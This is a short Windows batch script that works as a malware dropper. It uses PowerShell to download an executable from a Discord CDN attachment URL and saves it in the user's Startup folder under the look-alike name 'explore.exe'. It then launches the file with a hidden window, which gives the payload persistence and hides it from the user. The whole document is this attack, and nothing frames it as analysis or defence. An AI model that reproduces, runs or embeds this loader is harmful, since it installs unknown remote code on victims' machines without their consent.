@echo off

set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set "DownloadURL=https://cdn.discordapp.com/attachments/1163550537212493986/1163550951240634418/x.exe?ex=653ffc44&is=652d8744&hm=0824ada328febc8273d5d8c35c24982cdc74249d4292efd2ae1b51f5aeb1ba52&"
set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
